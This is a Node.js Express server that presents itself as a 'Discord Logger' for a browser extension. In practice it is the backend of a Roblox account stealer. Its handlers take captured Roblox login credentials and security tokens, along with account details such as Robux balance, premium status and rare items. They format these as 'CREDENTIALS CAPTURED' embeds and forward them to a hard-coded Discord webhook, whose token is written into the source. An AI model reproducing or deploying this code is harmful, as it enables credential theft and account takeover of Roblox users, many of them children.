
const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// Serve static files (extension files)
app.use(express.static(__dirname));

// Discord webhook URL from environment variable
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1407917425650827335/PYb8kRnJ_5KPHSd5vIxTo0_JCjeX-Ie63TRnmWDoxmBVYyHhhA27aYq2dKdmQP-BiRwq';

if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
  console.error('ERROR: DISCORD_WEBHOOK_URL environment variable is not set');
  console.error('Please either:');
  console.error('1. Set DISCORD_WEBHOOK_URL environment variable');
  console.error('2. Replace YOUR_DISCORD_WEBHOOK_URL_HERE with your actual webhook URL');
  process.exit(1);
}

// Endpoint to receive logs from browser extension
app.post('/send-log', async (req, res) => {
  try {
    const logData = req.body;
    console.log('Received log:', logData);
    
    // Format the log message for Discord
    const discordMessage = formatLogForDiscord(logData);
    
    // Send to Discord webhook
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(discordMessage)
    });

    if (response.ok) {
      console.log(`Log sent to Discord: ${logData.level} - ${logData.message.substring(0, 50)}...`);
      res.status(200).json({ success: true });
    } else {
      console.error('Failed to send to Discord:', response.status, response.statusText);
      res.status(500).json({ error: 'Failed to send to Discord' });
    }
  } catch (error) {
    console.error('Error sending log to Discord:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

function formatLogForDiscord(logData) {
  const levelEmojis = {
    log: '📝',
    info: 'ℹ️',
    warn: '⚠️',
    error: '❌',
    roblox_login: '🔐',
    roblox_userdata: '👤'
  };

  // Handle different types of Roblox logs
  if (logData.level === 'roblox_login') {
    return formatRobloxLoginEmbed(logData);
  } else if (logData.level === 'roblox_userdata') {
    return formatRobloxUserDataEmbed(logData);
  }

  // Standard log formatting
  const embed = {
    embeds: [{
      title: `${levelEmojis[logData.level] || '📝'} Browser Log - ${logData.level.toUpperCase()}`,
      description: `\`\`\`\n${logData.message}\`\`\``,
      color: getColorForLevel(logData.level),
      fields: [
        {
          name: 'URL',
          value: logData.url || 'Unknown',
          inline: true
        },
        {
          name: 'Timestamp',
          value: new Date(logData.timestamp).toLocaleString(),
          inline: true
        }
      ],
      footer: {
        text: `Tab: ${logData.tabTitle || 'Unknown'}`
      }
    }]
  };

  return embed;
}

function formatRobloxLoginEmbed(logData) {
  return {
    embeds: [{
      title: `🔐 ROBLOX LOGIN CREDENTIALS CAPTURED`,
      description: `\`\`\`\n${logData.message}\`\`\``,
      color: 0xff0000, // Red for security alert
      fields: [
        {
          name: '🌐 URL',
          value: logData.url || 'Unknown',
          inline: true
        },
        {
          name: '⏰ Timestamp',
          value: new Date(logData.timestamp).toLocaleString(),
          inline: true
        },
        {
          name: '⚠️ Security Alert',
          value: 'Credentials and security token captured',
          inline: false
        }
      ],
      footer: {
        text: `🔒 ROBLOX SECURITY BREACH DETECTED`
      },
      timestamp: new Date(logData.timestamp).toISOString()
    }]
  };
}

function formatRobloxUserDataEmbed(logData) {
  try {
    const userData = JSON.parse(logData.message);
    
    return {
      embeds: [{
        title: `👤 ROBLOX USER DATA CAPTURED`,
        color: 0x00ff00, // Green for user data
        fields: [
          {
            name: '👤 Username',
            value: userData.username || 'Unknown',
            inline: true
          },
          {
            name: '💰 Robux',
            value: userData.robux?.toString() || '0',
            inline: true
          },
          {
            name: '⭐ Premium',
            value: userData.isPremium ? 'Yes' : 'No',
            inline: true
          },
          {
            name: '📅 Account Age',
            value: `${userData.accountAge || 0} days`,
            inline: true
          },
          {
            name: '👥 Friends',
            value: userData.friendCount?.toString() || '0',
            inline: true
          },
          {
            name: '🌍 Country',
            value: userData.country || 'Unknown',
            inline: true
          },
          {
            name: '💀 Korblox',
            value: userData.korblox ? 'Yes' : 'No',
            inline: true
          },
          {
            name: '👻 Headless',
            value: userData.headless ? 'Yes' : 'No',
            inline: true
          },
          {
            name: '🎖️ Badges',
            value: userData.badgeCount?.toString() || '0',
            inline: true
          }
        ],
        footer: {
          text: `User ID: ${userData.userId || 'Unknown'}`
        },
        timestamp: new Date().toISOString()
      }]
    };
  } catch (error) {
    return {
      embeds: [{
        title: `👤 ROBLOX USER DATA CAPTURED`,
        description: `\`\`\`\n${logData.message}\`\`\``,
        color: 0x00ff00,
        timestamp: new Date().toISOString()
      }]
    };
  }
}

function getColorForLevel(level) {
  const colors = {
    log: 0x3498db,      // Blue
    info: 0x2ecc71,     // Green
    warn: 0xf39c12,     // Orange
    error: 0xe74c3c,    // Red
    roblox_login: 0xff0000, // Bright Red
    roblox_userdata: 0x00ff00 // Bright Green
  };
  return colors[level] || colors.log;
}

// Root endpoint with information about the service
app.get('/', (req, res) => {
  res.json({ 
    service: 'Discord Logger Webhook Service',
    status: 'Running',
    endpoints: {
      '/send-log': 'POST - Receive logs from browser extension',
      '/health': 'GET - Health check',
      '/popup.html': 'GET - Extension popup interface'
    },
    timestamp: new Date().toISOString() 
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Webhook service running on port ${PORT}`);
  console.log(`Discord webhook configured: ${DISCORD_WEBHOOK_URL ? 'Yes' : 'No'}`);
});
